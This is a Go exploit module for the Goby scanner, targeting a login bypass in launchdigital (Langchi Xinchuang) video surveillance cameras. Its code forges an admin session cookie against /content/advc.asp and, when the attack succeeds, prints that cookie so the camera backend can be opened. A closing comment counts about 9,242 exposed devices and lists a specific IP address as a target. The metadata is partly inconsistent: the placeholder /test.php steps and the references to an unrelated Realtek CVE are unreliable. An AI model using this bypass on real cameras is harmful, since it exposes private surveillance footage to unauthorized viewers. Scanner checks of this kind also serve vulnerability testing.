package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Langchi Xinchuang-Video Monitor /content/advc.asp Permission Bypass Vulnerability",
    "Description": "<p>launchdigital video surveillance camera, a login bypass vulnerability exists. An attacker can log into the backend to view video surveillance without an account password</p>",
    "Product": "launchdigital video surveillance camera",
    "Homepage": "http://www.launchdigital.net/",
    "DisclosureDate": "2022-07-22",
    "Author": "732903873@qq.com",
    "FofaQuery": "body=\"action=\\\"webs/loginHandle\"",
    "GobyQuery": "body=\"action=\\\"webs/loginHandle\"",
    "Level": "3",
    "Impact": "<p>An attacker can log into the backend to view video surveillance without an account password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Translation": {
        "CN": {
            "Name": "朗驰欣创-视频监 /content/advc.asp 权限绕过漏洞",
            "Product": "朗驰欣创-视频监控",
            "Description": "<p>朗驰欣创视频监控摄像头，存在登录绕过漏洞攻击者可在无账户口令的情况下登录后台查看视频监控。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可在无账户口令的情况下登录后台查看视频监控</span><br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Langchi Xinchuang-Video Monitor /content/advc.asp Permission Bypass Vulnerability",
            "Product": "launchdigital video surveillance camera",
            "Description": "<p>launchdigital video surveillance camera, a login bypass vulnerability exists. An attacker can log into the backend to view video surveillance without an account password<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>An attacker can log into the backend to view video surveillance without an account password<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "GifAddress": "",
    "References": [
        "http://www.launchdigital.net/"
    ],
    "RealReferences": [
        "http://packetstormsecurity.com/files/156083/Realtek-SDK-Information-Disclosure-Code-Execution.html",
        "http://seclists.org/fulldisclosure/2020/Jan/36",
        "http://seclists.org/fulldisclosure/2020/Jan/38",
        "https://sploit.tech",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-19824",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19824"
    ],
    "HasExp": true,
    "ExpParams": [],
    "Is0day": false,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CVSSScore": "8.5",
    "CNNVDIDs": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "CNNVD": [],
    "CNVD": [],
    "PocId": "10694"
}`

	//多字符串匹配
	strContainList := func(rawStr string, checkStrList []string) bool {
		for _, checkStr := range checkStrList {
			if !strings.Contains(rawStr, checkStr) {
				return false
			}
		}
		return true
	}
	checkStrList := []string{
		"href=\"#\" class=\"act", "<a href=\"playback.asp",
		"<a href=\"configue.html",
	}
	doGet := func(u *httpclient.FixUrl) bool {

		cfg := httpclient.NewGetRequestConfig("/content/advc.asp")
		// 或略 ssl 验证
		cfg.VerifyTls = false
		// 跟随跳转
		cfg.FollowRedirect = true
		// 超时
		cfg.Timeout = 15
		// 请求参数
		cfg.Header.Store("Cookie", "NVSID=admin%23N1123456%23N2"+u.HostInfo+"%23N3sz160sa120sb116sc0")
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.StatusCode == 200 && strContainList(resp.Utf8Html, checkStrList)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			return doGet(hostinfo)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if doGet(expResult.HostInfo) {
				expResult.Output = "please set Cookie:" + "NVSID=admin%23N1123456%23N2" + expResult.HostInfo.HostInfo + "%23N3sz160sa120sb116sc0"
				expResult.Success = true
			}
			return expResult
		},
	))
}

// fofa app="朗驰欣创-视频监控"  条数 9242
// http://59.46.115.138:808
